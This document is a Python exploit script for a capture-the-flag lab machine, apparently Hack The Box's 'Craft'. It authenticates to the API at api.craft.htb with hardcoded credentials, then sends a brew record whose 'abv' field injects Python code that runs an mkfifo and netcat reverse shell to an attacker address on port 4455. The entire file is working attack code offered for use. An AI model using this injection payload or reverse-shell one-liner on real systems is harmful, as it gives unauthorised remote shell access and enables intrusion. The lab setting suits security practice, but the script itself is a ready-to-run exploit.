#!/usr/bin/env python3

import requests
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

HOST="10.10.16.80"
PORT="4455"

notistr = "Do you already start a netcat listen on your machine as IP {ATTACKH}:{ATTACKP}? (Y/N)".format(ATTACKH=HOST, ATTACKP=PORT)
confirm = input(notistr)
if confirm.upper() != "Y":
    print("Please open nc first!")
    sys.exit(1)


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

get_apikey = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False, timeout=10)
json_response = get_apikey.json()
token = json_response['token']

print("Token!\n")
print(token)

apikeynm = "X-Craft-Api-Token"

custom_head = {apikeynm: token}

payload = {
    "id": 1,
    "brewer": "lesme",
    "name": "lesme",
    "style": "lesme",
    "abv": None
}

abvpld = "__import__('os').system('rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc {ATTACKH} {ATTACKP} >/tmp/f2')-2".format(ATTACKH=HOST, ATTACKP=PORT)
payload["abv"] = abvpld

print("\nPayload: \n")
print(payload)

push_revsh = requests.post("https://api.craft.htb/api/brew/", headers=custom_head, json=payload, verify=False)
if push_revsh.status_code == 500:
    print("Status code 500, reverse shell might be ok!")
else:
    print("Seems failed! Check the credentials!")
